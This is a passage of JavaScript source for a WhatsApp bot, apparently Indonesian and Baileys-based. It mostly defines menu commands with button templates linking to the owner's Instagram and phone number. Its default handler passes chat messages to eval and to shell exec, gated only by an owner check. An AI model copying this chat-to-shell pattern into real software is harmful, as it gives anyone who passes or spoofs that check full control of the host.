rikibos.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
//=================================================//
//=================================================//
case 'menucmd': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) throw sticBanLu(from)
buffer = await getBuffer(`https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg`)
anu = `Hii Kak ${pushname}  Selamat ${salam} 

┌──『 *MENU CMD* 』
│➳⊱setcmd
│➳⊱listcmd
│➳⊱delcmd
│➳⊱lockcmd
│➳⊱addmsg
│➳⊱listmsg
│➳⊱getmsg
│➳⊱delmsg
╰━═════════════━•`

const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
hydratedContentText: anu,
 locationMessage: {
 jpegThumbnail: buffer},
 hydratedFooterText: `${wm}`,
 hydratedButtons: [{
 "urlButton": {
 "displayText": "Sosmed",
 "url": "https://www.instagram.com/ryarllh_01/"
 }
},
{
 "callButton": {
 "displayText": "Call Owner",
 "phoneNumber": "+6287741097274"
 }
},
{
 "quickReplyButton": {
 "displayText": "Status Bot",
 "id": "ping"
 }
},
{
 "quickReplyButton": {
 "displayText": "Settings Menu",
 "id": "setallmenu",
 }
},
{
 "quickReplyButton": {
 "displayText": "Instagram",
 "id": "sc"
 }
}
]
}
}
}), { userJid: m.chat })
rikibos.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
//=================================================//
case 'menuanonymous': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) throw sticBanLu(from)
buffer = await getBuffer(`https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg`)
anu = `Hai kak ${pushname} 👋 Selamat ${salam} 

┌──『 *MENU ANONYMOUS* 』
│➳⊱anonymous
│➳⊱start
│➳⊱next
│➳⊱keluar
╰━═════════════━•`
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
hydratedContentText: anu,
 locationMessage: {
 jpegThumbnail: buffer},
 hydratedFooterText: `${wm}`,
 hydratedButtons: [{
 "urlButton": {
 "displayText": "Sosmed",
 "url": "https://www.instagram.com/ryarllh_01/"
 }
},
{
 "callButton": {
 "displayText": "Call Owner",
 "phoneNumber": "+6287741097274"
 }
},
{
 "quickReplyButton": {
 "displayText": "Status Bot",
 "id": "ping"
 }
},
{
 "quickReplyButton": {
 "displayText": "Settings Menu",
 "id": "setallmenu",
 }
},
{
 "quickReplyButton": {
 "displayText": "Instagram",
 "id": "sc"
 }
}
]
}
}
}), { userJid: m.chat })
rikibos.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
//=================================================//
case 'cmdmenu': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) throw sticBanLu(from)
sxs = `⭔ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`
anu = ` *Cmd Menu*

┌──『 *CMD MENU* 』 
│➳⊱setcmd
│➳⊱listcmd
│➳⊱delcmd
│➳⊱lockcmd
│➳⊱addmsg
│➳⊱listmsg
│➳⊱getmsg
│➳⊱delmsg
╰━═════════════━•`
let gambar = await getBuffer(global.menuimg)
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
 hydratedTemplate: {
hydratedContentText: anu,
locationMessage: { 
jpegThumbnail: await reSize(gambar, 200, 200)},
hydratedFooterText: sxs,
hydratedButtons: [
{ urlButton: { displayText: 'Sosmed', url: 'https://www.instagram.com/ryarllh_01/' } },
{ quickReplyButton: { displayText: 'Owner', id: `${prefix}owner` } }, 
{ quickReplyButton: { displayText: 'All Menu', id: `${prefix}allmenu` } },
 ] 
}
 }
}), { userJid: m.chat })
rikibos.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
//=================================================//

case 'menuunduh': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) throw sticBanLu(from)
sxs = `⭔ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`
anu = ` *MENU UNDUH*

┌──『 𝐌𝐄𝐍𝐔 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃 』 
│➳⊱pinterestdl [url]
│➳⊱ytmp3 [url]
│➳⊱ytmp4 [url]
│➳⊱getmusic [query]
│➳⊱getvideo [query]
│➳⊱tt [url]
│➳⊱ttnowm [url]
│➳⊱ttaudio [url]
│➳⊱tiktok [url]
│➳⊱ttmp3 [url]
│➳⊱mediafire [url]
╰━═════════════━•`
let gambar = await getBuffer(global.menuimg)
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
 hydratedTemplate: {
hydratedContentText: anu,
locationMessage: { 
jpegThumbnail: await reSize(gambar, 200, 200)},
hydratedFooterText: sxs,
hydratedButtons: [
{ urlButton: { displayText: 'Sosmed', url: 'https://www.instagram.com/ryarllh_01/' } },
{ quickReplyButton: { displayText: 'Owner', id: `${prefix}owner` } }, 
{ quickReplyButton: { displayText: 'All Menu', id: `${prefix}allmenu` } },
 ] 
}
 }
}), { userJid: m.chat })
rikibos.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
//=================================================//
//=================================================//
case 'menuowner': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) throw sticBanLu(from)
sxs = `⭔ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`
anu = ` *MENU OWNER* 

╭━═════════════━•
│『 *MENU OWNER* 』
╰━═════════════━•
╭━═════════════━•
│➳⊱react [emoji]
│➳⊱chat [option]
│➳⊱join [link]
│➳⊱leave
│➳⊱block @user
│➳⊱unblock @user
│➳⊱bcgroup [text]
│➳⊱bcimage
│➳⊱bctext
│➳⊱bcvideo
│➳⊱bcaudio
│➳⊱bcall [text]
│➳⊱setppbot [image]
│➳⊱setexif
│➳⊱setmenu [option]
│➳⊱ping
│➳⊱owner
│➳⊱creator
│➳⊱menu / help
│➳⊱delete
│➳⊱infochat
│➳⊱quoted
│➳⊱cowner
│➳⊱listpc
│➳⊱listgc
│➳⊱listonline
│➳⊱speedtest
╰━═════════════━•`
let gambar = await getBuffer(global.menuimg)
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
 hydratedTemplate: {
hydratedContentText: anu,
locationMessage: { 
jpegThumbnail: await reSize(gambar, 200, 200)},
hydratedFooterText: sxs,
hydratedButtons: [
{ urlButton: { displayText: 'Sosmed', url: 'https://www.instagram.com/ryarllh_01/' } },
{ quickReplyButton: { displayText: 'Owner', id: `${prefix}owner` } }, 
{ quickReplyButton: { displayText: 'All Menu', id: `${prefix}allmenu` } },
 ] 
}
 }
}), { userJid: m.chat })
rikibos.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
//=================================================//
case 'menuwibu': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) throw sticBanLu(from)
sxs = `⭔ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`
anu = ` *WIBU GAN* 

╭━═════════════━•
│『 *GAMBAR PENCIPTA* 』
╰━═════════════━•
╭━═════════════━•
│➳anime
│➳coffe
│➳quotesanime
│➳couple
│➳umma
│➳wibu
│➳loli
│➳bully
│➳waifu
│➳cuddle
│➳neko
│➳cry
│➳kiss
│➳hug
│➳lick
│➳awoo
│➳yeet
│➳bite
│➳lick
│➳pat
│➳kill
│➳nom
│➳poke
│➳wink
│➳bonk
│➳glomp
│➳smug
│➳blush
│➳wave
│➳smile
│➳highfive
│➳cringe
│➳dance
│➳happy
│➳handhold 
│➳darkjoke
│➳meme
│➳meme2
╰━═════════════━•`
let gambar = await getBuffer(global.menuimg)
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
 hydratedTemplate: {
hydratedContentText: anu,
locationMessage: { 
jpegThumbnail: await reSize(gambar, 200, 200)},
hydratedFooterText: sxs,
hydratedButtons: [
{ urlButton: { displayText: 'Sosmed', url: 'https://www.instagram.com/ryarllh_01/' } },
{ quickReplyButton: { displayText: 'Owner', id: `${prefix}owner` } }, 
{ quickReplyButton: { displayText: 'All Menu', id: `${prefix}allmenu` } },
 ] 
}
 }
}), { userJid: m.chat })
rikibos.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
//=================================================//
case 'menusuara': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) throw sticBanLu(from)
sxs = `⭔ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`
anu = ` *MENU SUARA* 

╭━═════════════━•
│『 *MENU SUARA* 』
╰━═════════════━•
╭━═════════════━•
│➳⊱sound1
│➳⊱sound2
│➳⊱sound3
│➳⊱sound4
│➳⊱sound5
│➳⊱sound6
│➳⊱sound7
│➳⊱sound8
│➳⊱sound9
│➳⊱sound10
│➳⊱sound11
│➳⊱sound12
│➳⊱sound13
│➳⊱sound14
│➳⊱sound15
│➳⊱sound16
│➳⊱sound17
│➳⊱sound18
│➳⊱sound19
│➳⊱sound20
│➳⊱sound21
│➳⊱sound22
│➳⊱sound23
│➳⊱sound24
│➳⊱sound25
│➳⊱sound26
│➳⊱sound27
│➳⊱sound28
│➳⊱sound29
│➳⊱sound30
│➳⊱sound31
│➳⊱sound32
│➳⊱sound33
│➳⊱sound34
│➳⊱sound35
│➳⊱sound36
│➳⊱sound37
│➳⊱sound38
│➳⊱sound39
│➳⊱sound40
│➳⊱sound41
│➳⊱sound42
│➳⊱sound43
│➳⊱sound44
│➳⊱sound45
│➳⊱sound46
│➳⊱sound47
│➳⊱sound48
│➳⊱sound49
│➳⊱sound50
│➳⊱sound51
│➳⊱sound52
│➳⊱sound53
│➳⊱sound54
│➳⊱sound55
│➳⊱sound56
│➳⊱sound57
│➳⊱sound58
│➳⊱sound59
│➳⊱sound60
│➳⊱sound61
│➳⊱sound62
│➳⊱sound63
│➳⊱sound64
│➳⊱sound65
│➳⊱sound66
│➳⊱sound67
│➳⊱sound68
│➳⊱sound69
│➳⊱sound70
│➳⊱sound71
│➳⊱sound72
│➳⊱sound73
│➳⊱sound74
│➳⊱sound75
│➳⊱sound76
│➳⊱sound77
│➳⊱sound78
│➳⊱sound79
│➳⊱sound80
│➳⊱sound81
│➳⊱sound82
│➳⊱sound83
│➳⊱sound84
│➳⊱sound85
│➳⊱sound86
│➳⊱sound87
│➳⊱sound88
│➳⊱sound89
│➳⊱sound90
│➳⊱sound91
│➳⊱sound92
│➳⊱sound93
│➳⊱sound94
│➳⊱sound95
│➳⊱sound96
│➳⊱sound97
│➳⊱sound98
│➳⊱sound99
│➳⊱sound100
│➳⊱sound101
│➳⊱sound102
│➳⊱sound103
│➳⊱sound104
│➳⊱sound105
│➳⊱sound106
│➳⊱sound107
│➳⊱sound108
│➳⊱sound109
│➳⊱sound110
│➳⊱sound111
│➳⊱sound112
│➳⊱sound113
│➳⊱sound114
│➳⊱sound115
│➳⊱sound116
│➳⊱sound117
│➳⊱sound118
│➳⊱sound119
│➳⊱sound120
│➳⊱sound121
│➳⊱sound122
│➳⊱sound123
│➳⊱sound124
│➳⊱sound125
│➳⊱sound126
│➳⊱sound127
│➳⊱sound128
│➳⊱sound129
│➳⊱sound130
│➳⊱sound131
│➳⊱sound132
│➳⊱sound133
│➳⊱sound134
│➳⊱sound135
│➳⊱sound136
│➳⊱sound137
│➳⊱sound138
│➳⊱sound139
│➳⊱sound140
│➳⊱sound141
│➳⊱sound142
│➳⊱sound143
│➳⊱sound144
│➳⊱sound145
│➳⊱sound146
│➳⊱sound147
│➳⊱sound148
│➳⊱sound149
│➳⊱sound150
│➳⊱sound151
│➳⊱sound152
│➳⊱sound153
│➳⊱sound154
│➳⊱sound155
│➳⊱sound156
│➳⊱sound157
│➳⊱sound158
│➳⊱sound159
│➳⊱sound160
│➳⊱sound161
╰━═════════════━•`
let gambar = await getBuffer(global.menuimg)
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
 hydratedTemplate: {
hydratedContentText: anu,
locationMessage: { 
jpegThumbnail: await reSize(gambar, 200, 200)},
hydratedFooterText: sxs,
hydratedButtons: [
{ urlButton: { displayText: 'Sosmed', url: 'https://www.instagram.com/ryarllh_01/' } },
{ quickReplyButton: { displayText: 'Owner', id: `${prefix}owner` } }, 
{ quickReplyButton: { displayText: 'All Menu', id: `${prefix}allmenu` } },
 ] 
}
 }
}), { userJid: m.chat })
rikibos.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
//=================================================//
case 'menurpg': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) throw sticBanLu(from)
sxs = `⭔ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`
anu = ` *Mini Games* 

╭━═════════════━•
│『 *MENU RPG* 』
╰━═════════════━•
╭━═════════════━•
│➳⊱leaderboard
│➳⊱inventori
│➳⊱mining
│➳⊱beli
│➳⊱jual
│➳⊱heal
│➳⊱berburu0
╰━═════════════━•`
let gambar = await getBuffer(global.menuimg)
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
 hydratedTemplate: {
hydratedContentText: anu,
locationMessage: { 
jpegThumbnail: await reSize(gambar, 200, 200)},
hydratedFooterText: sxs,
hydratedButtons: [
{ urlButton: { displayText: 'Sosmed', url: 'https://www.instagram.com/ryarllh_01/' } },
{ quickReplyButton: { displayText: 'Owner', id: `${prefix}owner` } }, 
{ quickReplyButton: { displayText: 'All Menu', id: `${prefix}allmenu` } },
 ] 
}
 }
}), { userJid: m.chat })
rikibos.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
//=================================================//
default:
if (budy.startsWith('=>')) {
if (!isCreator) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return bangkal(bang)}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
bangkal(String(e))}}
if (budy.startsWith('>')) {
if (!isCreator) return sticOwner(from)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await bangkal(evaled)
} catch (err) {
await bangkal(String(err))}}
if (budy.startsWith('$')) {
if (!isCreator) return 
exec(budy.slice(2), (err, stdout) => {
if(err) return bangkal(err)
if (stdout) return bangkal(stdout)})}
//=================================================//
//=================================================//
if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.data.database
if (!(budy.toLowerCase() in msgs)) return
rikibos.copyNForward(m.chat, msgs[budy.toLowerCase()], true)}}
} catch (err) {
m.reply(util.format(err))}}
//=================================================//
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
